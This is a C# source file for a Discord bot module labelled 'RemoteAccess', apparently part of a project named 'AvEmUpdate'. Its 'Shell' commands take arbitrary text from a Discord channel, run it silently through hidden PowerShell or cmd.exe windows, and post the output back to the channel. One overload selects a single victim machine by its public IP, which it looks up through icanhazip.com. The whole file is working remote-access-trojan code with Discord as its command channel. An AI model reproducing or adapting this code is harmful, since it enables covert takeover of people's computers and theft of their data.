using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace AvEmUpdate.Modules
{
    [Name("RemoteAccess")]
    public class RemoteAccessModule : ModuleBase<SocketCommandContext>
    {
        Process shellProcess;
        ProcessStartInfo shellStartInfo;

        public string getBotIp()
        {
            WebClient webClient = new WebClient();
            return webClient.DownloadString("http://icanhazip.com");
        }

        [Command("Shell")]
        public async Task Shell(string botIp, int hostApplication, [Remainder] string shellString)
        {
            if (getBotIp().Trim() == botIp.Trim())
            {
                switch (hostApplication)
                {
                    case 0:
                        try
                        {
                            shellStartInfo = new ProcessStartInfo()
                            {
                                FileName = "powershell.exe",
                                Arguments = "/c " + shellString,
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,
                            };
                            shellProcess = new Process();
                            shellProcess.StartInfo = shellStartInfo;

                            shellProcess.Start();

                            await sendCallBack(shellProcess.StandardOutput.ReadToEnd());
                            await sendErrorCallBack(shellProcess.StandardError.ReadToEnd());
                        }
                        catch (Exception ex)
                        {
                            await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                        }

                        break;

                    case 1:
                        try
                        {
                            shellStartInfo = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c " + shellString,
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,
                            };
                            shellProcess = new Process();
                            shellProcess.StartInfo = shellStartInfo;
                            shellProcess.Start();

                            await sendCallBack(shellProcess.StandardOutput.ReadToEnd());
                            await sendErrorCallBack(shellProcess.StandardError.ReadToEnd());
                        }
                        catch (Exception ex)
                        {
                            await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                        }
                        break;

                    default:
                        await Context.Channel.SendMessageAsync("`" + hostApplication + "` is not a valid host application, try 0 for PowerShell and 1 for CommandPrompt and try avoiding the double quotes '\"'");
                        break;
                }
            }
        }

        [Command("Shell")]
        public async Task Shell(int hostApplication, [Remainder]string shellString)
        {
            switch (hostApplication)
            {
                case 0:
                    try
                    {
                        shellStartInfo = new ProcessStartInfo()
                        {
                            FileName = "powershell.exe",
                            Arguments = "/c " + shellString,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            RedirectStandardError = true,
                            RedirectStandardOutput = true,
                        };
                        shellProcess = new Process();
                        shellProcess.StartInfo = shellStartInfo;

                        shellProcess.Start();
                        await sendCallBack(shellProcess.StandardOutput.ReadToEnd());
                        await sendErrorCallBack(shellProcess.StandardError.ReadToEnd());

                    }
                    catch (Exception ex)
                    {
                        await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                    }

                    break;

                case 1:
                    try
                    {
                        shellStartInfo = new ProcessStartInfo()
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c " + shellString,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            RedirectStandardError = true,
                            RedirectStandardOutput = true,
                        };
                        shellProcess = new Process();
                        shellProcess.StartInfo = shellStartInfo;

                        shellProcess.Start();

                        await sendCallBack(shellProcess.StandardOutput.ReadToEnd());
                        await sendErrorCallBack(shellProcess.StandardError.ReadToEnd());

                    }
                    catch (Exception ex)
                    {
                        await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                    }
                    break;

                default:
                    await Context.Channel.SendMessageAsync("`" + hostApplication + "` is not a valid host application, try 0 for PowerShell and 1 for CommandPrompt and try avoiding the double quotes '\"'");
                    break;
            }
        }

        public async Task sendCallBack(string callBack)
        {
            if (callBack != "" && callBack != null)
            {
                if (callBack.Length > 2000)
                {
                    string[] callBackArray = callBack.SplitByLength(1000);

                    foreach (string callBackArrayString in callBackArray)
                    {
                        await Context.Channel.SendMessageAsync("```" + callBackArrayString + "```");
                    }
                }
                else
                {
                    await Context.Channel.SendMessageAsync("```" + callBack + "```");
                }
            }
        }

        public async Task sendErrorCallBack(string callBack)
        {
            if (callBack != "" && callBack != null)
            {
                if (callBack.Length > 2000)
                {
                    string[] callBackArray = callBack.SplitByLength(1000);

                    foreach (string callBackArrayString in callBackArray)
                    {
                        await Context.Channel.SendMessageAsync("```" + callBackArrayString + "```");
                    }
                }
                else
                {
                    await Context.Channel.SendMessageAsync("```" + callBack + "```");
                }
            }
        }

    }
}
